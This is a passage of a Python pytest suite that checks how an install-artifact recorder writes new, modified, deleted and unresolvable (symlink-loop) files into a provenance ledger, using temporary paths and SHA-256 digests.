        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        tool = self._tool(tmp_path, monkeypatch)
        ledger = ProvenanceLedger()
        now = time.time_ns()

        recorded = record_install_artifacts(
            ledger,
            [(tool, self._digest(tool), now)],
            not_before_ns=now - 10**9,
            snapshot={},
            observed_at_ns=now,
            baseline=frozenset({tool}),
        )

        assert recorded == 0
        assert ledger.lookup(tool) is LedgerMiss.MISS

    def test_a_genuinely_new_file_is_recorded(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        tool = self._tool(tmp_path, monkeypatch)
        ledger = ProvenanceLedger()
        now = time.time_ns()

        recorded = record_install_artifacts(
            ledger,
            [(tool, self._digest(tool), now)],
            not_before_ns=now - 10**9,
            snapshot={},
            observed_at_ns=now,
            baseline=frozenset(),
        )

        assert recorded == 1
        assert isinstance(ledger.lookup(tool), ProvenanceEnvelope)

    def test_a_baseline_file_with_changed_content_is_a_modification(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        tool = self._tool(tmp_path, monkeypatch)
        ledger = ProvenanceLedger()
        now = time.time_ns()

        recorded = record_install_artifacts(
            ledger,
            [(tool, self._digest(tool), now)],
            not_before_ns=now - 10**9,
            snapshot={tool: hashlib.sha256(b"old contents\n").hexdigest()},
            observed_at_ns=now,
            baseline=frozenset({tool}),
        )

        # The baseline says it existed; the digest says the install wrote it.
        # Existence is not innocence once the bytes changed.
        assert recorded == 1
        assert isinstance(ledger.lookup(tool), ProvenanceEnvelope)

    def test_a_removed_baseline_file_is_not_recorded(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        tool = self._tool(tmp_path, monkeypatch)
        ledger = ProvenanceLedger()
        now = time.time_ns()

        recorded = record_install_artifacts(
            ledger,
            [],
            not_before_ns=now - 10**9,
            snapshot={tool: self._digest(tool)},
            observed_at_ns=now,
            baseline=frozenset({tool}),
        )

        assert recorded == 0
        assert ledger.lookup(tool) is LedgerMiss.MISS, "deletion is not a write"

    def test_an_unresolvable_path_refuses_without_raising(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        tool = self._tool(tmp_path, monkeypatch)
        loop = tool.parent / "loop"
        loop.symlink_to(loop)
        ledger = ProvenanceLedger()
        now = time.time_ns()

        recorded = record_install_artifacts(
            ledger,
            [(loop, "a" * 64, now)],
            not_before_ns=now - 10**9,
            snapshot={},
            observed_at_ns=now,
            baseline=frozenset({loop}),
        )

        assert recorded == 0
        # The ledger cannot even canonicalize the loop, so the observation must
        # have stopped at the recorder; the neighbouring path proves the run
        # continued and recorded nothing.
        assert ledger.lookup(tool) is LedgerMiss.MISS
